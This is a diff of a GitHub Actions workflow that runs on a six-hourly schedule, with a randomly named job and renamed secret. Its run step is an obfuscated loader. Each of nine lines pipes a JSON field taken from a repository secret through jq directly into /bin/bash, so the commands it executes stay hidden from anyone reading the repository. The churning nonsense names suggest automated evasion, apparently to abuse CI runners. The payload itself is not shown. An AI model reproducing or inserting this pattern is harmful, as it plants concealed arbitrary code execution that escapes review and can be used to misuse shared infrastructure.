@@ -2,7 +2,7 @@ name: huangjiao2315
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
+    - cron: '31 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangjiao2315
         env:
-          qjgb46: ${{ secrets.qjgb46 }}
+          gfm22114: ${{ secrets.gfm22114 }}
         run: |
-          echo $qjgb46 | jq -r .m13 | /bin/bash
-          echo $kwbo54373 | jq -r .jwv5 | /bin/bash
-          echo $a9 | jq -r .jes35 | /bin/bash
-          echo $x20239 | jq -r .jlm7216 | /bin/bash
-          echo $s752 | jq -r .zdj92342 | /bin/bash
-          echo $rx62 | jq -r .pn138 | /bin/bash
-          echo $fznk461 | jq -r .dum53395 | /bin/bash
-          echo $otija5066 | jq -r .lfh84153 | /bin/bash
-          echo $xugfh5 | jq -r .lre6352 | /bin/bash
+          echo $gfm22114 | jq -r .ztm799 | /bin/bash
+          echo $dsb0 | jq -r .es82 | /bin/bash
+          echo $ksm9 | jq -r .mk55910 | /bin/bash
+          echo $iyqr4167 | jq -r .m048 | /bin/bash
+          echo $kc073 | jq -r .zxxfr160 | /bin/bash
+          echo $grahq7508 | jq -r .vhl22815 | /bin/bash
+          echo $ezyk25337 | jq -r .p297 | /bin/bash
+          echo $qvx8779 | jq -r .iq3786 | /bin/bash
+          echo $jj7261 | jq -r .ttu141 | /bin/bash
 
